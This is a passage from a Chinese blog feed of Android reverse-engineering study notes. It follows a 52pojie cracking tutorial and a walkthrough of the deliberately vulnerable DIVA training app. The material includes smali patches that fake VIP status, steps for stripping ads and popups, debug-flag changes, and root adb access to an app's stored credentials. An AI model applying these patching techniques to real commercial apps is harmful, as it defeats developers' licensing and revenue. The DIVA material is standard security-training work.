Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    return p5  //返回p5的值</span><br><span class="line">.end method //方法结束</span><br><span class="line"></span><br><span class="line">//判断是否是大会员的方法</span><br><span class="line">.method public final isvip()Z</span><br><span class="line">    .registers 2</span><br><span class="line"></span><br><span class="line">    const/4 v0, 0x0 //v0赋值0</span><br><span class="line"></span><br><span class="line">    return v0 //返回v0的值</span><br><span class="line"></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要有两个判断一个硬币判断一个大会员判断，直接改就是了</p>
<p>修改方法：修改判断、强制跳转、修改寄存器的值</p>
<h2 id="恭喜你获得广告-amp-弹窗静默卡"><a href="#恭喜你获得广告-amp-弹窗静默卡" class="headerlink" title="恭喜你获得广告&amp;弹窗静默卡"></a>恭喜你获得广告&amp;弹窗静默卡</h2><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h3><p>1.了解安卓四大组件、Activity生命周期<br>2.弹窗定位、去更新<br>3.广告分析与布局优化</p>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>1.教程Demo(更新)<br>2.MT管理器&#x2F;NP管理器:activity记录<br>3.算法助手：hook弹窗<br>4.雷电模拟器<br>5.开发助手</p>
<h3 id="广告类型"><a href="#广告类型" class="headerlink" title="广告类型"></a>广告类型</h3><p>启动广告   弹窗&amp;更新广告  横幅广告</p>
<h3 id="安卓四大组件"><a href="#安卓四大组件" class="headerlink" title="安卓四大组件"></a>安卓四大组件</h3><table>
<thead>
<tr>
<th align="center">组件</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Activity(活动)</td>
<td align="center">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td>
</tr>
<tr>
<td align="center">Service(服务)</td>
<td align="center">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td>
</tr>
<tr>
<td align="center">Broadcast Receiver(广播接收器)</td>
<td align="center">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td>
</tr>
<tr>
<td align="center">Content Provider(内容提供者)</td>
<td align="center">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td>
</tr>
</tbody></table>
<h4 id="activity的切换"><a href="#activity的切换" class="headerlink" title="activity的切换"></a>activity的切换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:label=<span class="string">&quot;@string/app_name&quot;</span>  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span>&gt;  &lt;!--当前Activity是否可以被另一个Application的组件启动：<span class="literal">true</span>允许被启动；<span class="literal">false</span>不允许被启动--&gt;</span><br><span class="line">    &lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br><span class="line">    &lt;intent-filter&gt;  </span><br><span class="line">        &lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br><span class="line">        &lt;action  </span><br><span class="line">            android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;  </span><br><span class="line">        &lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br><span class="line">        &lt;category  </span><br><span class="line">            android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;  </span><br><span class="line">    &lt;/intent-filter&gt;  </span><br><span class="line">&lt;/activity&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure>

<p>启动广告流程：<br>启动Activity-&gt;广告Activity-&gt;主页Activity</p>
<p>修改方法：<br>1.修改加载时间<br>2.Acitivity切换定位，修改Intent的Activity类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (position) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent.setClass(it.getContext(), ChallengeFirst.class);  </span><br><span class="line">        it.getContext().startActivity(intent);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent2.setClass(it.getContext(), ChallengeSecond.class);  </span><br><span class="line">        it.getContext().startActivity(intent2);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  <span class="comment">//new一个Intent，</span></span><br><span class="line">        intent3.setClass(it.getContext(), AdActivity.class);  <span class="comment">//传入要切换的Acitivity的类名</span></span><br><span class="line">        it.getContext().startActivity(intent3);  <span class="comment">//启动对应的Activity</span></span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent4.setClass(it.getContext(), ChallengeFourth.class);  </span><br><span class="line">        it.getContext().startActivity(intent4);  </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h3><table>
<thead>
<tr>
<th align="center">函数名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onCreate()</td>
<td align="center">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>
</tr>
<tr>
<td align="center">onStart()</td>
<td align="center">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>
</tr>
<tr>
<td align="center">onResume()</td>
<td align="center">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>
</tr>
<tr>
<td align="center">onPause()</td>
<td align="center">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>
</tr>
<tr>
<td align="center">onStop()</td>
<td align="center">这个方法是在Activity完全不可见的时候调用的。</td>
</tr>
<tr>
<td align="center">onDestroy()</td>
<td align="center">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>
</tr>
<tr>
<td align="center">onRestart()</td>
<td align="center">当Activity从停止stop状态恢进入start状态时调用状态。</td>
</tr>
</tbody></table>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319154909284.png" alt="image-20230319154909284" style="zoom:50%;" />

<h3 id="弹窗定位-amp-堆栈分析"><a href="#弹窗定位-amp-堆栈分析" class="headerlink" title="弹窗定位&amp;堆栈分析"></a>弹窗定位&amp;堆栈分析</h3><p>修改方法：<br>1.修改xml中的versiocode<br>2.Hook弹窗(推荐算法助手开启弹窗定位)<br>3.修改dex弹窗代码<br>4.抓包修改响应体(也可以路由器拦截)</p>
<h3 id="布局优化"><a href="#布局优化" class="headerlink" title="布局优化"></a>布局优化</h3><p>1.开发者助手抓布局<br>2.MT管理器xml搜索定位<br>3.修改xml代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure>

<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><ul>
<li>使用MT分析弹窗的activity</li>
<li>进入classes.dex文件中搜索对应activity</li>
<li>进行对应修改</li>
<li>或者使用算法助手hook弹窗，或者看调用堆栈修改代码</li>
<li>或者开发助手布局查看获取ID，xml搜索进行修改（注意设置ID转名称）</li>
</ul>
<h2 id="1000-7-x3D-？-amp-动态调试-amp-Log插桩"><a href="#1000-7-x3D-？-amp-动态调试-amp-Log插桩" class="headerlink" title="1000-7&#x3D;？&amp;动态调试&amp;Log插桩"></a>1000-7&#x3D;？&amp;动态调试&amp;Log插桩</h2><p><a href="https://www.52pojie.cn/thread-1714727-1-1.html">《安卓逆向这档事》五、1000-7&#x3D;？&amp;动态调试&amp;Log插桩 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><del>感觉开始上难度了。。。</del></p>
<h3 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h3><p>了解并掌握动态调试<br>了解并掌握Log插桩</p>
<h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><p>教程Demo<br>MT管理器&#x2F;NP管理器<br>jeb（相当于IDA java版）<br>雷电模拟器<br>XappDebug</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>什么是动态调试：动态调试是指自带的调试器跟踪自己软件的运行，可以在调试的过程中知道参数或者局部变量的值以及履清代码运行的先后顺序。多用于爆破注册码(CTF必备技能)</p>
<p>Log插桩:Log插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke-<span class="keyword">static</span> &#123;对应寄存器&#125;, Lcom/mtools/LogUtils;-&gt;v(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure>



<h3 id="动态调试步骤"><a href="#动态调试步骤" class="headerlink" title="动态调试步骤"></a>动态调试步骤</h3><h4 id="修改debug权限"><a href="#修改debug权限" class="headerlink" title="修改debug权限"></a>修改debug权限</h4><p>方法一:在AndroidManifest.xml里添加可调试权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android:debuggable=<span class="string">&quot;true&quot;</span> <span class="comment">//application里面修改</span></span><br></pre></td></tr></table></figure>

<p>方法二：XappDebug模块hook对应的app</p>
<p><a href="https://github.com/Palatis/XAppDebug">XappDebug</a></p>
<p>方法三：Magisk命令(重启失效)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.  adb shell #adb进入命令行模式</span><br><span class="line">2.  su #切换至超级用户</span><br><span class="line">3.  magisk resetprop ro.debuggable 1</span><br><span class="line">4.  stop;start; #一定要通过该方式重启</span><br></pre></td></tr></table></figure>

<p>方法四:刷入MagiskHide Props Config模块(比较麻烦）</p>
<h4 id="端口转发以及开启adb权限"><a href="#端口转发以及开启adb权限" class="headerlink" title="端口转发以及开启adb权限"></a>端口转发以及开启adb权限</h4><p>版本号点击七次开启开发者模式并开启adb调试权限</p>
<p>夜神模拟器：adb connect 127.0.0.1:62001</p>
<h4 id="下段点"><a href="#下段点" class="headerlink" title="下段点"></a>下段点</h4><p>ctrl+b下断点</p>
<h4 id="debug模式启动"><a href="#debug模式启动" class="headerlink" title="debug模式启动"></a>debug模式启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure>

<p>adb shell am start -D -n<br>adb shell am start -D -n 包名&#x2F;类名<br>am start -n 表示启动一个activity<br>am start -D 表示将应用设置为可调试模式</p>
<h4 id="Jeb附加调试进程"><a href="#Jeb附加调试进程" class="headerlink" title="Jeb附加调试进程"></a>Jeb附加调试进程</h4><p>激活jeb</p>
<p>这章云了。。。</p>
]]></content>
      <tags>
        <tag>逆向</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title>DIVA_Android</title>
    <url>/2023/03/25/DIVA-Android/</url>
    <content><![CDATA[<p>参考：</p>
<p><a href="https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn#am">Android 调试桥 (adb)  | Android 开发者  | Android Developers (google.cn)</a></p>
<p><a href="https://blog.csdn.net/cch139745/article/details/53420179">(40条消息) 通过DIVA了解APP安全问题_diva 安全实战_aetkrad的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/Everywhere_wwx/article/details/82256421">(40条消息) Android diva 分析（全)_Flemington、的博客-CSDN博客</a></p>
<p><a href="https://danishzia.medium.com/diva-android-app-walkthrough-bce72b7f273a">DIVA Android App — Walkthrough. Hi, | by Danish Zia | Medium</a></p>
<p><a href="https://www.cnblogs.com/Iamyoyodan/p/14923579.html">DIVA闯关-APP测试 - yoyodan - 博客园 (cnblogs.com)</a></p>
<p><a href="https://support.yeshen.com/zh-CN/qt/ml">Android ADB使用之详细篇 | 夜神模拟器帮助中心 (yeshen.com)</a></p>
<span id="more"></span>

<h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><p>Java JDK 1.8、Android SDK Tools、夜神模拟器、Apktool、dex2jar、jd-gui、AXMLPrinter2.jar、jeb（反编译）</p>
<p>使用夜神时可能会出现屏幕显示过大，可以修改渲染设置</p>
<p>之前一直adb devices找不到设备，发现可能原因是 模拟器里面开了代理的原因，关了就成功了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\software\yeshen\Nox\bin&gt;nox_adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62025 device</span><br><span class="line"></span><br><span class="line">E:\software\yeshen\Nox\bin&gt;adb connect 127.0.0.1:62025</span><br><span class="line">already connected to 127.0.0.1:62025</span><br></pre></td></tr></table></figure>

<p>命令记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit：退出shell</span><br><span class="line">adb shell：进入shell</span><br><span class="line">adb logcat：看日志</span><br></pre></td></tr></table></figure>



<h2 id="不安全的日志输出"><a href="#不安全的日志输出" class="headerlink" title="不安全的日志输出"></a>不安全的日志输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell ps| grep -i diva</span><br><span class="line">adb shell logcat | grep 316(或adb logcat)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkout</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">cctxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0096</span>);  <span class="comment">// id:ccText</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.processCC(cctxt.getText().toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(RuntimeException re) &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;diva-log&quot;</span>, <span class="string">&quot;Error while processing transaction with credit card: &quot;</span> + cctxt.getText().toString());</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;An error occured. Please try again later&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040027</span>);  <span class="comment">// layout:activity_log</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCC</span><span class="params">(String ccstr)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="硬编码—第一部分"><a href="#硬编码—第一部分" class="headerlink" title="硬编码—第一部分"></a>硬编码—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HardcodeActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">access</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007B</span>)).getText().toString().equals(<span class="string">&quot;vendorsecretkey&quot;</span>)) &#123;  <span class="comment">// id:hcKey</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access granted! See you on the other side :)&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied! See you in hell :D&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001F</span>);  <span class="comment">// layout:activity_hardcode</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007B</span>)).getText().toString().equals(<span class="string">&quot;vendorsecretkey&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>很明确了，第二个输入字符串：<em><strong>vendorsecretkey</strong></em> 即可</p>
<h2 id="不安全的数据存储—第一部分"><a href="#不安全的数据存储—第一部分" class="headerlink" title="不安全的数据存储—第一部分"></a>不安全的数据存储—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.preference.PreferenceManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage1Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040023</span>);  <span class="comment">// layout:activity_insecure_data_storage1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">sharedPreferences$Editor0</span> <span class="operator">=</span> PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).edit();</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0088</span>);  <span class="comment">// id:ids1Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0089</span>);  <span class="comment">// id:ids1Pwd</span></span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="string">&quot;user&quot;</span>, usr.getText().toString());</span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="string">&quot;password&quot;</span>, pwd.getText().toString());</span><br><span class="line">        sharedPreferences$Editor0.commit();</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用了SharedPreferences类，该类是Android平台上一个轻量级的存储类，主要是用来保存一些常用的配置，本例中是用该类存储了用户名和密码，因此是具有风险的。SharedPreferences类存储的数据会以.xml的形式存储在&#x2F;data&#x2F;data&#x2F;apppackagename&#x2F;shared_prefs目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">不安全的数据存储也是App常见的安全问题之一，主要有三种方式：</span><br><span class="line">1，将敏感数据保存到配置文件中；</span><br><span class="line">2，将敏感数据保存在本地的sqlite3数据库中；</span><br><span class="line">3，将敏感数据保存在临时文件或者sd卡中。</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\software\yeshen\Nox\bin&gt;adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/ # ls</span><br><span class="line">acct</span><br><span class="line">cache</span><br><span class="line">charger</span><br><span class="line">config</span><br><span class="line">d</span><br><span class="line">data</span><br><span class="line">default.prop</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">file_contexts</span><br><span class="line">fstab.shamu</span><br><span class="line">init</span><br><span class="line">init.environ.rc</span><br><span class="line">init.rc</span><br><span class="line">init.shamu.rc</span><br><span class="line">init.trace.rc</span><br><span class="line">init.usb.rc</span><br><span class="line">init.zygote32.rc</span><br><span class="line">lib</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">property_contexts</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">sdcard</span><br><span class="line">seapp_contexts</span><br><span class="line">selinux_version</span><br><span class="line">sepolicy</span><br><span class="line">service_contexts</span><br><span class="line">storage</span><br><span class="line">sys</span><br><span class="line">system</span><br><span class="line">ueventd.rc</span><br><span class="line">ueventd.shamu.rc</span><br><span class="line">vendor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/ # cd data/data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/data/data # ls</span><br><span class="line">bin.mt.plus</span><br><span class="line">com.android.Calendar</span><br><span class="line">com.android.backupconfirm</span><br><span class="line">com.android.bluetooth</span><br><span class="line">com.android.browser</span><br><span class="line">com.android.calculator2</span><br><span class="line">com.android.camera2</span><br><span class="line">com.android.captiveportallogin</span><br><span class="line">com.android.certinstaller</span><br><span class="line">com.android.contacts</span><br><span class="line">com.android.defcontainer</span><br><span class="line">com.android.deskclock</span><br><span class="line">com.android.documentsui</span><br><span class="line">com.android.dreams.basic</span><br><span class="line">com.android.externalstorage</span><br><span class="line">com.android.gallery3d</span><br><span class="line">com.android.htmlviewer</span><br><span class="line">com.android.inputdevices</span><br><span class="line">com.android.inputmethod.pinyin</span><br><span class="line">com.android.keychain</span><br><span class="line">com.android.launcher3</span><br><span class="line">com.android.location.fused</span><br><span class="line">com.android.managedprovisioning</span><br><span class="line">com.android.mms.service</span><br><span class="line">com.android.onetimeinitializer</span><br><span class="line">com.android.packageinstaller</span><br><span class="line">com.android.pacprocessor</span><br><span class="line">com.android.phasebeam</span><br><span class="line">com.android.phone</span><br><span class="line">com.android.printspooler</span><br><span class="line">com.android.providers.calendar</span><br><span class="line">com.android.providers.contacts</span><br><span class="line">com.android.providers.downloads</span><br><span class="line">com.android.providers.downloads.ui</span><br><span class="line">com.android.providers.media</span><br><span class="line">com.android.providers.settings</span><br><span class="line">com.android.providers.telephony</span><br><span class="line">com.android.providers.userdictionary</span><br><span class="line">com.android.provision</span><br><span class="line">com.android.proxyhandler</span><br><span class="line">com.android.server.telecom</span><br><span class="line">com.android.settings</span><br><span class="line">com.android.sharedstoragebackup</span><br><span class="line">com.android.shell</span><br><span class="line">com.android.soundrecorder</span><br><span class="line">com.android.systemui</span><br><span class="line">com.android.vpndialogs</span><br><span class="line">com.android.wallpaper.livepicker</span><br><span class="line">com.android.wallpapercropper</span><br><span class="line">com.cyanogenmod.filemanager</span><br><span class="line">com.google.android.webview</span><br><span class="line">com.svox.pico</span><br><span class="line">com.tencent.mm</span><br><span class="line">com.tencent.mobileqq</span><br><span class="line">de.robv.android.xposed.installer</span><br><span class="line">jakhar.aseem.diva</span><br><span class="line">just.trust.me</span><br><span class="line"></span><br><span class="line">cd jakhar.aseem.diva/shared_prefs/     </span><br><span class="line">	</span><br><span class="line">root@shamu:/data/data/jakhar.aseem.diva/shared_prefs # ls</span><br><span class="line">jakhar.aseem.diva_preferences.xml</span><br><span class="line">at jakhar.aseem.diva_preferences.xml                                          &lt;</span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">    &lt;string name=&quot;user&quot;&gt;xcc&lt;/string&gt;</span><br><span class="line">    &lt;string name=&lt;/string&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>得到存的账号密码了。</p>
<h2 id="不安全的数据存储—第二部分"><a href="#不安全的数据存储—第二部分" class="headerlink" title="不安全的数据存储—第二部分"></a>不安全的数据存储—第二部分</h2><p>对应代码：</p>
